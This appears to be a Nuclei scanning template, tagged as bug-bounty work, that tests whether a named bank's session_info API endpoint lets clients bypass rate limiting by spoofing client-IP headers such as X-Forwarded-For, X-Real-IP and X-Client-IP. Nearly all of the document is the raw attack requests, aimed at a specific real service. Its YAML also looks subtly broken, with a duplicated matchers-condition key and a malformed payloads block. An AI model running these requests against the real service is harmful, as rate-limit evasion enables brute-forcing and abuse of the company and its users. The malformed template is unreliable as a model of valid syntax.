id: tinkoff-rate-limit-bypass

info:
  name: Tinkoff - Rate Limit Bypass
  author: bugbounty
  severity: medium
  description: Rate limiting bypass via header manipulation
  tags: rate-limit,bypass,tinkoff

http:
  - raw:
      - |
        GET /api/common/v1/session_info?platform=web&sessionid=test HTTP/1.1
        Host: {{Hostname}}
        X-Forwarded-For: 127.0.0.1

      - |
        GET /api/common/v1/session_info?platform=web&sessionid=test HTTP/1.1
        Host: {{Hostname}}
        X-Originating-IP: 192.168.1.1

      - |
        GET /api/common/v1/session_info?platform=web&sessionid=test HTTP/1.1
        Host: {{Hostname}}
        X-Remote-IP: 10.0.0.1
        X-Remote-Addr: 10.0.0.1

      - |
        GET /api/common/v1/session_info?platform=web&sessionid=test HTTP/1.1
        Host: {{Hostname}}
        X-Client-IP: 172.16.0.1
        X-Real-IP: 172.16.0.1

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: body
        words:
          - "session"
          - "data"
        condition: or

    req-condition: true
    matchers-condition: and
    payloads:
      iterations: 100
